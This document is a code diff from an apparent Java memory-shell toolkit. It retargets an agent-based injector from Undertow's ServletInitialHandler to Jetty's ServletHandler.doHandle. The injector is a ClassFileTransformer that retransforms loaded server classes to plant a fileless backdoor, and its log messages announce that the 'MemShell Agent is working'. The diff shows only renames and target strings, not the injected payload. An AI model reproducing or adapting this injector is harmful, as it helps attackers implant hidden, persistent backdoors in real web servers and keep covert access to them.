@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.injector.undertow;
+package com.reajason.javaweb.memshell.injector.jetty;
 
 import org.objectweb.asm.*;
 
@@ -11,9 +11,9 @@ import java.security.ProtectionDomain;
  * @author ReaJason
  * @since 2025/3/26
  */
-public class UndertowServletInitialHandlerAgentWithAsmInjector implements ClassFileTransformer {
-    private static final String TARGET_CLASS = "io/undertow/servlet/handlers/ServletInitialHandler";
-    private static final String TARGET_METHOD_NAME = "handleFirstRequest";
+public class JettyHandlerAgentWithAsmInjector implements ClassFileTransformer {
+    private static final String TARGET_CLASS = "org/eclipse/jetty/servlet/ServletHandler";
+    private static final String TARGET_METHOD_NAME = "doHandle";
 
     static Constructor<?> constructor = null;
 
@@ -27,7 +27,7 @@ public class UndertowServletInitialHandlerAgentWithAsmInjector implements ClassF
         }
     }
 
-    public UndertowServletInitialHandlerAgentWithAsmInjector() {
+    public JettyHandlerAgentWithAsmInjector() {
     }
 
     @Override
@@ -85,13 +85,13 @@ public class UndertowServletInitialHandlerAgentWithAsmInjector implements ClassF
 
     private static void launch(Instrumentation inst) throws Exception {
         System.out.println("MemShell Agent is starting");
-        inst.addTransformer(new UndertowServletInitialHandlerAgentWithAsmInjector(), true);
+        inst.addTransformer(new JettyHandlerAgentWithAsmInjector(), true);
         for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
             String name = allLoadedClass.getName();
             if (TARGET_CLASS.replace("/", ".").equals(name)) {
                 inst.retransformClasses(allLoadedClass);
             }
         }
-        System.out.println("MemShell Agent is working at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest");
+        System.out.println("MemShell Agent is working at org.eclipse.jetty.servlet.ServletHandler.doHandle");
     }
 }
